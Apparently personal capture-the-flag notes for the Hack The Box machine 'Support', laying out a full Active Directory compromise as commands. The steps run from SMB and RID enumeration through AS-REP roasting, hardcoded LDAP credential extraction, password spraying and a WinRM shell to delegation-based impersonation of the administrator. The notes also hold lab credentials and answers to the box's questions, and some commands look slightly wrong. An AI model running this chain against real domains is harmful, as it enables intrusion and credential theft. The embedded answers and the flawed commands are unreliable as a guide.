HTB - Support (Easy) 
AD/Windows

**nmap**
`sudo nmap -p- -Pn -T5 10.10.11.174 -oN nmap`



---
**SMB**

check shares with `netexec
`nxc smb rhost -u '' -p '' --shares`

check shares with `anonymous/guest` user
`nxc smb rhost -u 'anonymous' -p '' --shares`
![[Pasted image 20250506122620.png]]

we can see ``IPC`` is a `Relative Identifier (rid)` so we can bruteforce it
to enumerate users
`nxc smb rhost -u 'anonymous' -p '' --rid-brute
make a txt file of users

**asreproast**
steal asrep hashes of users
``impacket-GetNPUsers -request -dc-ip rhost -userfile ./users.txt support.htb``

nvm, it's useless anyway so dont bother
![[Pasted image 20250506130040.png]]

we can also see `support-tools` is also readable, so we can see its contents
`smbclient -U anonymous //rhost/support-tools`

---
**getting LDAP credentials**
install `mono` in your PC, if you dont have it yet, 
go to `https://www.mono-project.com/docs/getting-started/install/linux/`
after that, open wireshark and capture packets,
and then run the binary using 
`sudo wine UserInfo.exe`
in wireshark, look for packet that says `bindRequest` and you can find the credential

![[Pasted image 20250506180441.png]]

**verify credential**
check if other users uses the same password
`nxc smb rhost -u users.txt -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --continue-on-success`

use netexec to check ldap permission on shares
`nxc smb rhost -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --shares`

check for passwords on user description
it is important because some of the admins dont realize that other users can see user description and sometimes they put the user password there
`nxc smb rhost -u 'ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users`

shows nothing
![[Pasted image 20250506185438.png]]


**bloodhound**
`nxc smb rhost -u 'ldap' -p pass.txt --bloudhound -c all --dns-server rhost`
OR
`bloodhound-python -c all -u ldap -p pass.txt -d support.htb -ns rhost`

**LDAP**
`ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb"`

it's messy. you can output it to txt file and grep
`ldapsearch -H ldap://support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" > ldapsearch.txt`

something's interesting in one of it's user bearing `info` tag
`cat ldapsearch.txt | grep info`
![[Pasted image 20250506190914.png]]

**verify credential 2**
`nxc smb rhost -u users.txt -p 'Ironside47pleasure40Watchful' --continue-on-success`
the account `support` uses that password

**dump shares with support user**
`nxc smb 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful' --shares    `

**connect and spawn shell**
`evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'`



---
**privilege escalation**
you can  check the bloodhound data and you can see that user `support` is in the group `shared support account` and that group has `genericall` to the `Domain Controller`

![[Pasted image 20250506195053.png]]


**impacket**
since the user has GenericAll enabled, we can add computer to the DC
add computer
`impacket-addcomputer -method SAMR -computer-name 'BUSHIT' -computer-pass 'YAWAKA' -dc-host 'dc.support.htb' 'support.htb/support:Ironside47pleasure40Watchful'`

`impacket-rbcd -delegate-from 'BUSHIT$' -delegate-to 'DC$' -action 'write' support.htb/support:Ironside47pleasure40Watchful'   `

`impacket-getST -spn 'cifs/BUSHIT.support.htb' -impersonate 'administrator' 'support.htb/BUSHIT$:YAWAKA'` 

---
<h3>QUESTIONS</h3>
Task 1: How many shares is Support showing on SMB?
`6`
  
Task 2: Which share is not a default share for a Windows domain controller?
`support-tools`

Task 3: Almost all of the files in this share are publicly available tools, but one is not. What is the name of that file?
`UserInfo.exe.zip`

Task 4: What is the hardcoded password used for LDAP in the `UserInfo.exe` binary?
